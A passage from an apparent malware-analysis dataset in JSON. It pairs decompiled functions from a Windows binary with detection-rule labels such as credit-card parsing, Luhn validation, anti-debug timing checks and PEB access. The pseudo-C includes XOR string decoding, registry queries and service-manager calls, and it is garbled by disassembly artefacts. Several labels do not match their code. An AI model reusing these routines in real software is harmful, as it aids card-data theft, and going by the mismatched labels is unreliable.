0xe58be73);\n        cVar2 = cVar3 + *extraout_ECX_06;\n        cVar22 = SCARRY1(cVar3, *extraout_ECX_06) != SCARRY1(cVar2, '\\0');\n        cVar20 = cVar2 < '\\0';\n        uVar16 = cVar2 == '\\0';\n    }\n    fcn.00402b40(0x407010, 0x15, uVar30, uVar27);\n    uVar27 = 0x41129c;\n    uVar30 = 0x15;\n    uVar26 = 0x403402;\n    fcn.00402b40(0x407010, 0x15, 0x41129c, 0xc);\n    if ((uVar16 || cVar22 != cVar20) || (!uVar16 && cVar22 == cVar20)) {\n        uVar26 = 0xe;\n    }\n    fcn.00402b40(0x407010, 0x15, 0x4112a8, uVar26);\n    uVar8 = fcn.00402b40(0x407010, 0x15, 0x4112b8, 0x11);\n    uVar16 = (POPCOUNT(uVar8 & 0xcb) & 1U) == 0;\n    uVar26 = 0x13;\n    do {\n        uVar24 = fcn.00402b40(0x407010, 0x15, 0x4112cc, uVar26);\n        iVar12 = uVar24 >> 0x20;\n        puVar7 = uVar24;\n        if ((uVar16) || (!uVar16)) {\n            arg_14h_00 = 0x14;\n            uVar27 = 0x4112e0;\n            uVar30 = 0x15;\n            iVar10 = extraout_ECX_07;\ncode_r0x00403489:\n            puVar7 = iVar12 + 0x15;\n            uVar11 = iVar10 + 1 >> 8;\n            uVar17 = CARRY1(*puVar7, uVar11);\n            uVar23 = SCARRY1(*puVar7, uVar11);\n            *puVar7 = *puVar7 + uVar11;\n            uVar19 = *puVar7 == 0;\n            uVar16 = (POPCOUNT(*puVar7) & 1U) == 0;\n            fcn.00402b40(0x407010, uVar30, uVar27, arg_14h_00);\n            if (uVar17 || uVar19) goto code_r0x004034b9;\n        }\n        else {\n            piVar29 = iVar12 + 0x14;\n            *piVar29 = *piVar29 + -0x68;\n            iVar10 = extraout_ECX_07 + -1;\n            arg_14h_00 = extraout_ECX_07;\n            if (iVar10 == 0 || *piVar29 == 0) goto code_r0x00403489;\n            uVar11 = uVar24;\n            uVar17 = CARRY1(*puVar7, uVar11);\n            uVar23 = SCARRY1(*puVar7, uVar11);\n            *puVar7 = *puVar7 + uVar11;\n            uVar19 = *puVar7 == 0;\n            uVar16 = (POPCOUNT(*puVar7) & 1U) == 0;\n        }\n        if (!uVar17 && !uVar19) {\ncode_r0x004034b9:\n            uVar26 = 0x4034cc;\n            fcn.00402b40(0x407010, 0x15, 0x4112f4, 0x33);\n            if ((uVar17 || uVar19) || (!uVar17 && !uVar19)) {\n                uVar26 = 10;\n                uVar25 = 0x411328;\n            }\n            else {\n                *(puVar14 + 0x6a) = *(puVar14 + 0x6a) - &stack0xffffffb4;\n            }\n            fcn.00402b40(0x407010, 0x15, uVar25, uVar26);\n            fcn.00402b40(0x407010, 0x15, 0x411334, 4);\n            fcn.00402b40(0x407010, 0x15, 0x411338, 5);\n            fcn.00402b40(0x407010, 0x15, 0x411340, 6);\n            fcn.00402b40(0x407010, 0x15, 0x411374, 0x2a);\n            fcn.00402b40(0x407010, 0x15, 0x4113a0, 0xb);\n            return;\n        }\n        if (!uVar23) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    } while( true );\n}\n",
        "token_count": 4546
    },
    "00404e00": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404e23) overlaps instruction at (ram,0x00404e21)\n// \n// WARNING: Removing unreachable block (ram,0x00404e23)\n\nbool fcn.00404e00(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00402e40(0x80000002, 0x41140c, 0x41144c, &var_8h, &var_10ch, &var_4h);\n    bVar2 = iVar1 == 0;\n    if (bVar2) {\n        return false;\n    }\n    if ((!bVar2) && (bVar2)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 258
    },
    "00401fb0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004020d8) overlaps instruction at (ram,0x004020d4)\n// \n\nuint __cdecl fcn.00401fb0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    uint8_t uVar6;\n    uint extraout_EDX;\n    uint uVar5;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint *puVar9;\n    uint8_t uVar10;\n    bool bVar11;\n    char cVar12;\n    char cVar13;\n    float10 extraout_ST0;\n    unkbyte6 Var14;\n    uint in_stack_ffffffa8;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    var_4h = fcn.00402900(arg_18h, arg_1ch, 0x411170, 7);\n    pcVar2 = _sym.imp.MSVCRT.dll_rand;\n    if (var_4h == NULL) {\n        return 0;\n    }\n    var_24h = 0;\n    puVar8 = &var_23h;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    uVar7 = 0;\n    do {\n        Var14 = (*pcVar2)();\n        (&var_24h)[uVar7] = Var14;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0x20);\n    uVar3 = Var14 >> 0x20;\n    uVar6 = Var14 >> 0x28;\n    uVar10 = CARRY1(uVar3, uVar6);\n    cVar13 = SCARRY1(uVar3, uVar6);\n    cVar12 = uVar3 + uVar6 < '\\0';\n    bVar11 = uVar3 + uVar6 == '\\0';\n    puVar8 = &var_24h;\n    puVar9 = var_4h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    if ((!cVar12) && (cVar12)) {\n        puVar1 = puVar9 + 1;\n        puVar8 = puVar8 + 1;\n        *(puVar9 + 7) = extraout_ST0;\n        uVar10 = *puVar8 < *puVar1;\n        cVar13 = SBORROW1(*puVar8, *puVar1);\n        cVar12 = *puVar8 - *puVar1 < '\\0';\n        bVar11 = *puVar8 == *puVar1;\n    }\n    uVar3 = fcn.004015d0(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n    if ((bVar11 || cVar13 != cVar12) || (iVar4 = extraout_ECX,  uVar5 = extraout_EDX,  !bVar11 && cVar13 == cVar12)) {\n        iVar4 = arg_1ch;\n        uVar5 = arg_18h;\n        in_stack_ffffffa8 = arg_18h;\n    }\n    *(iVar4 + 0x52) = (*(iVar4 + 0x52) - uVar5) - (uVar3 < 0x8b || uVar3 + 0x75 < uVar10);\n    fcn.00402c80(&stack0xfffffffc, in_stack_ffffffa8);\n    return 1;\n}\n",
        "token_count": 948
    },
    "00402260": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402260(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00402fe0();\n        int.00404840();\n        fcn.00404600();\n        if (*0x4225c8 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.004026a0();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 160
    },
    "00402990": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004029c3) overlaps instruction at (ram,0x004029c2)\n// \n\nint32_t __cdecl fcn.00402990(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t unaff_EBX;\n    uint16_t *unaff_EDI;\n    bool bVar1;\n    \n    bVar1 = (POPCOUNT(in_EAX & 0xcb) & 1U) == 0;\n    if ((bVar1) || (!bVar1)) {\n        in_EAX = arg_10h;\n        unaff_EDI = arg_ch;\n    }\n    *(unaff_EBX + 0x7d8b1045) = *(unaff_EBX + 0x7d8b1045) | 0xc;\n    for (; in_EAX != 0; in_EAX = in_EAX + -1) {\n        arg_8h = arg_8h + *unaff_EDI;\n        if (arg_8h >> 0x10 != 0) {\n            arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n        }\n        unaff_EDI = unaff_EDI + 1;\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 322
    },
    "00404a60": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404b96) overlaps instruction at (ram,0x00404b91)\n// \n// WARNING: Control flow encountered bad instruction data\n\nvoid __fastcall\nfcn.00404a60(uint param_1, int32_t *param_2, uint *param_3, uint32_t param_4, uint32_t *param_5, uint32_t *param_6)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint8_t extraout_CL;\n    uint16_t uVar5;\n    uint32_t extraout_ECX;\n    uint32_t uVar6;\n    uint32_t extraout_EDX;\n    int32_t unaff_EBX;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint *unaff_EDI;\n    uint *arg_ch;\n    uint8_t in_CF;\n    uint8_t in_AF;\n    bool bVar9;\n    char in_SF;\n    char cVar10;\n    char in_OF;\n    bool bVar11;\n    unkbyte10 in_ST0;\n    float10 extraout_ST0;\n    \n    uVar8 = param_4;\n    arg_ch = param_3;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        *(in_EAX + -0x7ce92414) = in_ST0;\n        uVar2 = in_EAX - 1U;\n        uVar1 = 9 < (uVar2 & 0xf) | in_AF;\n        uVar2 = uVar2 + uVar1 * '\\x06';\n        uVar2 = uVar2 + (0x90 < (uVar2 & 0xf0) | in_CF | uVar1 * (0xf9 < uVar2)) * '`';\n        *param_2 = *param_2 + 0x458bdf84;\n        uVar8 = in_EAX - 1U & 0xffffff00 | uVar2 | 0x8b;\n        arg_ch = unaff_EDI;\n        if (-1 < (uVar2 | 0x8b)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    uVar3 = fcn.00402990(0, arg_ch, uVar8 + 1 >> 1);\n    uVar8 = uVar3;\n    uVar5 = (extraout_ECX ^ 0x6dd) + 1;\n    uVar6 = (extraout_ECX & 0xffff0000 | uVar5 & 0xff | (uVar5 >> 8) + uVar3 << 8) ^ extraout_EDX;\n    bVar11 = false;\n    cVar10 = uVar6 < 0;\n    bVar9 = uVar6 == 0;\n    iVar4 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    if ((!bVar11) && (bVar11)) {\n        *arg_ch = param_3;\n        return;\n    }\n    uVar6 = *(iVar4 + 0x58);\n    if ((bVar9 || bVar11 != cVar10) || (!bVar9 && bVar11 == cVar10)) {\n        bVar9 = uVar3 < uVar6;\n    }\n    else {\n        unaff_EBX = unaff_EBX + 1;\n        *(iVar4 + 0x6639da56) = *(iVar4 + 0x6639da56) ^ extraout_CL;\n        bVar9 = uVar8 < uVar6;\n    }\n    if (bVar9) {\n        if ((!bVar9) && (uVar8 = uVar3 & 0xff | (uVar8 >> 8) << 8,  bVar9)) {\n            out(0xbd, iVar4);\n            return;\n        }\n        iVar7 = (uVar8 - uVar6 & 0xffff) - 1;\n    }\n    else {\n        iVar7 = uVar8 - (uVar6 & 0xffff);\n    }\n    if (iVar7 < uVar6 >> 0x10) {\n        iVar7 = (iVar7 - (uVar6 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar7 = iVar7 - (uVar6 >> 0x10);\n    }\n    if ((-1 < iVar7) && (-1 >= iVar7)) {\n        *(uVar6 + 0x1c) = extraout_ST0;\n        iVar7 = iVar7 + 5;\n    }\n    uVar8 = iVar7 + param_4;\n    *param_6 = uVar8;\n    if ((uVar8 == 0 || SCARRY4(iVar7, param_4) != uVar8 < 0) || (uVar8 != 0 && SCARRY4(iVar7, param_4) == uVar8 < 0)) {\n        param_4 = *(iVar4 + 0x58);\n        param_6 = param_5;\n    }\n    *(iVar4 + -0x74c625aa) = *(iVar4 + -0x74c625aa) ^ param_6;\n    *(unaff_EBX + 0x5e5f5851) = *(unaff_EBX + 0x5e5f5851) + param_6;\n    *param_6 = param_4;\n    return;\n}\n",
        "token_count": 1228
    },
    "00402ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00402ae0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00402260;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x411128;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00402b40": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402b40(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < arg_14h) {\n        do {\n            *(iVar1 + arg_10h) = arg_14h ^ *(iVar1 + arg_10h) ^ *(iVar1 % arg_ch + arg_8h);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "00403600": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1",
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403983) overlaps instruction at (ram,0x00403981)\n// \n\nvoid fcn.00403600(void)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    int16_t in_AX;\n    uint32_t *puVar3;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    int32_t extraout_EDX;\n    uint unaff_EBP;\n    int16_t iVar4;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar5;\n    bool bVar6;\n    bool bVar7;\n    char cVar8;\n    char cVar9;\n    ulong uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    ushort uVar14;\n    ushort uVar15;\n    \n    cVar9 = SCARRY2(in_AX, 1);\n    cVar8 = in_AX + 1 < 0;\n    bVar6 = in_AX == -1;\n    uVar12 = 0x40361d;\n    puVar5 = unaff_ESI;\n    uVar10 = fcn.00402b40(0x407010, 0x15, 0x41112c, 0x11);\n    if ((bVar6 || cVar9 != cVar8) || (!bVar6 && cVar9 == cVar8)) {\n        uVar12 = 0xf;\n        unaff_EBP = 0x411348;\n        puVar5 = 0x15;\n    }\n    puVar2 = uVar10 + 0x6a39da56;\n    *puVar2 = *puVar2 ^ extraout_ECX;\n    pcVar1 = (uVar10 >> 0x20) + 0x15;\n    *pcVar1 = *pcVar1 + (extraout_ECX + 1 >> 8);\n    fcn.00402b40(0x407010, puVar5, unaff_EBP, uVar12);\n    fcn.00402b40(0x407010, 0x15, 0x411358, 0x1a);\n    fcn.00402b40(0x407010, 0x15, 0x4113ac, 10);\n    fcn.00402b40(0x407010, 0x15, 0x4113b8, 0xb);\n    fcn.00402b40(0x407010, 0x15, 0x4113c4, 8);\n    fcn.00402b40(0x407010, 0x15, 0x4113cc, 9);\n    fcn.00402b40(0x407010, 0x15, 0x4113d8, 9);\n    fcn.00402b40(0x407010, 0x15, 0x4113e4, 9);\n    fcn.00402b40(0x407010, 0x15, 0x4113f0, 0xc);\n    while( true ) {\n        bVar6 = false;\n        puVar3 = fcn.00402b40(0x407010, 0x15, 0x4113fc, 3);\n        if ((bVar6) || (!bVar6)) break;\n        if (&stack0xffffffe4 < *puVar3 || puVar3 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    uVar11 = 0x411400;\n    uVar12 = 0x15;\n    fcn.00402b40(0x407010, 0x15, 0x411400, 10);\n    bVar6 = false;\n    fcn.00402b40(0x407010, 0x15, 0x41140c, 0x40);\n    if ((bVar6) || (uVar13 = extraout_ECX_00,  !bVar6)) {\n        uVar13 = 0xc;\n        uVar11 = 0x41144c;\n        uVar12 = 0x15;\n    }\n    puVar5 = unaff_EDI + 1;\n    *unaff_EDI = *unaff_ESI;\n    *0x4c680c7f = *0x4c680c7f + (extraout_ECX_00 >> 8);\n    fcn.00402b40(0x407010, uVar12, uVar11, uVar13);\n    fcn.00402b40(0x407010, 0x15, 0x411458, 0xb);\n    iVar4 = unaff_ESI + 5;\n    bVar6 = SBORROW2(iVar4, iVar4);\n    fcn.00402b40(0x407010, 0x15, 0x411464, 4);\n    if ((!bVar6) && (bVar6)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar11 = 0x411468;\n    uVar12 = 0x15;\n    fcn.00402b40(0x407010, 0x15, 0x411468, 4);\n    bVar6 = false;\n    uVar13 = 0x403905;\n    fcn.00402b40(0x407010, 0x15, 0x41146c, 0xc);\n    if ((bVar6) || (!bVar6)) {\n        uVar13 = 4;\n        uVar11 = 0x411478;\n        uVar12 = 0x15;\n    }\n    else {\n        puVar5 = puVar5 ^ *(unaff_EDI + 0xe58be77);\n        if (puVar5 < 0) goto code_r0x0040392f;\n    }\n    *(extraout_EDX + 0x15) = *(extraout_EDX + 0x15) + (extraout_ECX_01 + 1 >> 8);\n    fcn.00402b40(0x407010, uVar12, uVar11, uVar13);\ncode_r0x0040392f:\n    fcn.00402b40(0x407010, 0x15, 0x41147c, 9);\n    bVar6 = extraout_ECX_02 < 0x5354;\n    bVar7 = extraout_ECX_02 == 0x5354;\n    uVar14 = 0x15;\n    uVar15 = 0;\n    fcn.00402b40(0x407010, 0x15, 0x411488, 0x16);\n    if ((!bVar6 && !bVar7) && (bVar6 || bVar7)) {\n        *(puVar5 + 0x6a) = *(puVar5 + 0x6a) - &stack0xffffffe4;\n    }\n    fcn.00402b40(0x407010, 0x15, 0x4114a0, CONCAT22(uVar15, uVar14));\n    return;\n}\n",
        "token_count": 1665
    },
    "00401000": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00401000(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar1 = fcn.00403c40(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 85
    },
    "00401480": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401480(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (arg_14h != 0) {\n        do {\n            *(uVar1 + arg_10h) = *(uVar1 + arg_10h) ^ *(uVar1 % arg_ch + arg_8h);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "00401830": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040187b) overlaps instruction at (ram,0x0040187a)\n// \n// WARNING: Removing unreachable block (ram,0x00401851)\n\nuint fcn.00401830(void)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t unaff_EBX;\n    uint *puVar3;\n    bool bVar4;\n    \n    puVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x411220);\n    puVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (puVar1 == NULL) {\n        return 0;\n    }\n    bVar4 = false;\n    *0x4225bc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(puVar1, 0x411230);\n    if ((bVar4) || (!bVar4)) {\n        *0x4225c0 = (*puVar3)(puVar1, 0x41124c);\n    }\n    else {\n        uVar2 = *0x4225bc + 1;\n        *puVar3 = *puVar1;\n        *(puVar1 + 3) = *(puVar1 + 3) + 'h';\n        *0x4225c0 = uVar2 & 0xffffff00 | *(unaff_EBX + (uVar2 & 0xff));\n        puVar1 = puVar1 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *0x4225c4 = (*puVar3)(puVar1, 0x41125c);\n    if (((*0x4225bc != 0) && (*0x4225c0 != 0)) && (*0x4225c4 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 411
    },
    "004018e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004019f7) overlaps instruction at (ram,0x004019ee)\n// \n// WARNING: Removing unreachable block (ram,0x004019e8)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004018e0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    char *pcVar3;\n    int16_t extraout_CX;\n    int32_t iVar4;\n    uint32_t unaff_EBX;\n    uint *puVar5;\n    bool bVar6;\n    uint8_t in_AF;\n    bool bVar7;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint s;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    s._0_1_ = 0;\n    puVar5 = &var_20fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &s + 1;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x40, *0x10 + -0x214, arg_8h);\n    fcn.00404c90(*0x10 + -8, 0xf4);\n    bVar6 = false;\n    bVar7 = unaff_EBX == extraout_CX;\n    pcVar3 = fcn.00401a20(var_4h);\n    if ((!bVar7) && (bVar7)) {\n        iVar4 = ((unaff_EBX >> 8 & 0xffff00) << 8 | unaff_EBX & 0xffff) + 1;\n        uVar2 = pcVar3;\n        if (bVar6 || iVar4 == 0) {\n            *pcVar3 = *pcVar3 + uVar2;\n            goto code_r0x004019f7;\n        }\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        piVar1 = (pcVar3 & 0xffff0000 | CONCAT11((pcVar3 >> 8) + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - iVar4;\n    }\n    iVar4 = fcn.00401ea0(&s, var_4h, var_8h);\n    if (iVar4 == 0) {\n        return 0;\n    }\ncode_r0x004019f7:\n    // WARNING: Bad instruction - Truncating control flow here\n    fcn.00402100(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 767
    },
    "00401c60": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d37) overlaps instruction at (ram,0x00401d32)\n// \n\nuint __cdecl fcn.00401c60(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    char *pcVar3;\n    char extraout_CL;\n    uint in_ECX;\n    char *in_EDX;\n    int32_t extraout_EDX;\n    uint unaff_EBX;\n    uchar *unaff_EDI;\n    bool in_CF;\n    bool bVar4;\n    bool in_ZF;\n    bool in_OF;\n    uint var_8h;\n    uint var_ch;\n    uint uStack168;\n    int32_t iStack164;\n    uint var_94h;\n    uint uStack48;\n    uint uStack44;\n    \n    if ((!in_OF) && (in_OF)) {\n        uVar1 = in(in_EDX);\n        *unaff_EDI = uVar1;\n        if (!in_CF && !in_ZF) {\n            bVar4 = (POPCOUNT(&stack0xffffff58 & 0xff) & 1U) == 0;\n            uStack168 = 0x94;\n            (*_sym.imp.KERNEL32.dll_GetVersionExA)(&stack0xffffff58);\n            if (((bVar4) || (!bVar4)) && (iStack164 == 5)) {\n                return 1;\n            }\n            pcVar3 = extraout_EDX + 0x1b80976;\n            *pcVar3 = *pcVar3 + pcVar3;\n            pcVar3 = CONCAT31(unaff_EBX >> 8, 0xbc) + 0x51c35de5;\n            *pcVar3 = *pcVar3 + extraout_CL;\n            if ((*0xfffffee0 == 6) && (*0xfffffee4 == 0)) {\n                return 1;\n            }\n            return 0;\n        }\n    }\n    *in_EDX = *in_EDX + (in_ECX >> 8);\n    uVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    uStack44 = 0x401cb3;\n    fcn.004049e0(uVar2, var_8h);\n    uStack48 = 0x401ce0;\n    uStack44 = uVar2;\n    uVar2 = fcn.00404d90();\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n    return uVar2;\n}\n",
        "token_count": 576
    },
    "00402e40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402e40(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 != 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 186
    },
    "00402ef0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402ef0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, arg_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 271
    },
    "004039a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain pusha popa sequence"
        ],
